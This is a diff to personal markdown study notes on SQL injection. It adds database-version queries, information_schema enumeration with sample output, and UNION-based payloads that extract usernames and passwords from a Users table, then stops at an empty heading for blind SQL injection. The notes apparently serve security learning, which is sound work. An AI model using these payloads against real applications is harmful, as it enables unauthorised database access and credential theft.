@@ -1,3 +1,4 @@
+## SQL Injection
 `Web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.`
 
 SQL injection common occurrences location:
@@ -39,6 +40,63 @@ Retrieving multiple value within a single column
  
 `' UNION SELECT username || '~' || password FROM users--`
 
+Query database type & Version
+
+---
+
+Querying for database version.
+
+| Database type    | Query                     |
+| ---------------- | ------------------------- |
+| Microsoft, MySQL | `SELECT @@version`        |
+| Oracle           | `SELECT * FROM v$version` |
+| PostgreSQL       | `SELECT version()`        |
+`' UNION SELECT @@version--`
+`'+UNION+SELECT+@@version,+NULL#`
+
+
+List content of Database
+
+`SELECT * FROM information_schema.tables`
+List out tables
+
+Output will be like 
+
+```
+TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE ===================================================== 
+MyDatabase dbo Products BASE TABLE 
+MyDatabase dbo Users    BASE TABLE 
+MyDatabase dbo Feedback BASE TABLE
+```
+
+
+SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+
+```
+TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE ================================================================= MyDatabase dbo Users UserId   int 
+MyDatabase dbo Users Username varchar 
+MyDatabase dbo Users Password varchar
+```
+
+
+' UNION select column_name,NULL from information_schema.columns where table_name ='Users' -- 
+
+`' UNION SELECT username,password FROM Users -- `
+
+
+
+---
+
+# Blind SQL Injection
+
+- Exploit by using conditional responses
+
+
+
+
+
+
+
 
 
 ```
@@ -51,3 +109,6 @@ UNION
 UNION SELECT NULL-- 
 
 ```
+
+
+
